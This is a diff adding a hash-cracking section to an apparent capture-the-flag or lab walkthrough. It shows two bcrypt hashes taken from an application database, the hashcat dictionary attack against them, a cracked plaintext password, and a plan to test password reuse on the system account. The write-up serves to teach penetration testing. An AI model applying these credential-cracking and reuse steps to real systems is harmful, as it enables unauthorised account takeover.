@@ -1569,7 +1569,74 @@ www-data@enigma:~/html/openstamanager/files$
 
 ### 4.3 Cracking the Hashes
 
+**Command:** `echo 'admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu' > hashes.txt ; echo 'haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' >> hashes.txt`
 
+**Breakdown:**
+
+- `> hashes.txt`
+    - **Description:** Creates/overwrites `hashes.txt` with the first hash entry.
+    - **Purpose:** Starts a clean file with the admin hash in `username:hash` format.
+- `>>`
+    - **Description:** Appends to an existing file without overwriting it.
+    - **Purpose:** Adds the haris hash on a new line below the admin entry, giving hashcat a clean two-entry file to work against.
+- `;`
+    - **Description:** Runs both commands sequentially on one line regardless of whether the first succeeds.
+    - **Purpose:** Keeps both file-writing operations in a single terminal entry without the line-joining issue caused by the backslash `\` continuation used in the previous attempt.
+
+**Command:** `cat hashes.txt`
+
+**Result:**
+
+```
+admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Puharis:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
+```
+
+The file is clean — two entries, one per line, each correctly prefixed with its username. Now run hashcat:
+
+**Command:** `hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username`
+
+**Breakdown:**
+
+- `-m 3200`
+    - **Description:** Selects hash mode 3200, corresponding to bcrypt (`$2*$` / Blowfish).
+    - **Purpose:** Matches the exact hash format recovered from the `zz_users` table — identifiable by the `$2y$10$` prefix.
+- `-a 0`
+    - **Description:** Straight/dictionary attack mode.
+    - **Purpose:** Tests every password in the wordlist against both hashes sequentially — the simplest and fastest approach before trying rules or masks.
+- `hashes.txt`
+    - **Description:** The file containing both hashes in `username:hash` format.
+    - **Purpose:** Feeds both hashes to hashcat simultaneously so both are attempted in the same session rather than running two separate jobs.
+- `/usr/share/wordlists/rockyou.txt`
+    - **Description:** The RockYou leaked password wordlist containing 14 million real-world passwords.
+    - **Purpose:** The most commonly used starting wordlist for credential attacks — covers the vast majority of weak and commonly chosen passwords.
+- `--username`
+    - **Description:** Tells hashcat to expect and ignore the `username:` prefix in the hash file.
+    - **Purpose:** Without this flag hashcat would try to parse the username as part of the hash and throw a token length exception — as seen in the previous failed attempt.
+
+**Result:** The status output shows `Recovered: 1/2 (50.00%)` — one of the two hashes cracked during the session. The line `INFO: Removed hash found as potfile entry` at the start also indicates hashcat already had one hash in its potfile (its cache of previously cracked hashes) from an earlier session, meaning `haris` had already been cracked before this run began. The `admin` hash did not crack within the wordlist — either the password is not in rockyou or it is strong enough to resist a straight dictionary attack.
+
+The cracked result was confirmed with:
+
+**Command:** `hashcat -m 3200 hashes.txt --show --username`
+
+**Breakdown:**
+
+- `--show`
+    - **Description:** Displays all previously cracked hashes from the potfile instead of running a new attack.
+    - **Purpose:** Quickly retrieves cracked results without re-running the full attack — useful for confirming results after a session completes or is interrupted.
+- `--username`
+    - **Description:** Includes the username prefix in the output.
+    - **Purpose:** Maps the cracked plaintext back to the correct account so there is no ambiguity about which password belongs to which user.
+
+**Result:**
+
+```
+haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
+```
+
+The `haris` hash cracked successfully to the plaintext password **`bestfriends`**. The `admin` hash produced no result — confirming the admin account uses a stronger password not present in the rockyou wordlist.
+
+With a plaintext credential for `haris` in hand, the next step is to test whether this password is reused for the OS-level `haris` account on the system.
 <div align="center">
 <br>
 <br>
